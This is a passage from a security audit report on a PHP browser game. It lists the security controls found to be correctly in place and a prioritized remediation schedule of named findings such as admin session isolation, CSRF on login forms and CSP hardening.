- **API authentication:** `api.php` correctly validates session token against DB, forces `joueur = $_SESSION['login']`, uses whitelist dispatch table, and rate limits.
- **Prepared statements:** All database queries use prepared statements throughout -- SQL injection risk is minimal.
- **DB credentials:** Stored in `.env` file loaded via `env.php`, not hardcoded in source -- correct approach.
- **CSRF on game forms:** All game action pages (don, marche, attaquer, compte, etc.) properly call `csrfCheck()`.
- **Idle timeout:** Player sessions expire after 1 hour of inactivity (`basicprivatephp.php` line 47).
- **XSS output encoding:** `htmlspecialchars(ENT_QUOTES, 'UTF-8')` is used consistently across admin and game pages.
- **Column whitelists:** `db_helpers.php` uses strict column/table whitelists for the `ajouter()` function.

---

## Remediation Priority

### Immediate (before going live):
1. SEC-R2-001 + SEC-R2-004: Isolate admin session namespace
2. SEC-R2-002 + SEC-R2-016: Add CSRF to admin/moderation login forms
3. SEC-R2-003: Enforce minimum password policy
4. SEC-R2-007: Fix timing-unsafe MD5 comparison in compte.php
5. SEC-R2-008: Bounds-check transformInt() output

### Short-term (within 1 week):
6. SEC-R2-005: Fix rate limiter race condition with proper file locking
7. SEC-R2-006: Rotate CSRF tokens after use
8. SEC-R2-009: Add admin session idle/absolute timeout
9. SEC-R2-010: Sanitize admin news HTML on storage
10. SEC-R2-018: Sanitize log entries against injection
11. SEC-R2-019: Add account-based rate limiting alongside IP-based

### Medium-term (within 1 month):
12. SEC-R2-011: Remove unsafe-inline from CSP (requires inline script refactoring)
13. SEC-R2-012: Add HSTS (after HTTPS is enabled)
14. SEC-R2-013: Increase bcrypt cost to 12
15. SEC-R2-015: Hardcode cookie_secure=1 (after HTTPS)
16. SEC-R2-014: Individual admin accounts
17. SEC-R2-021: Move rate limit storage out of /tmp
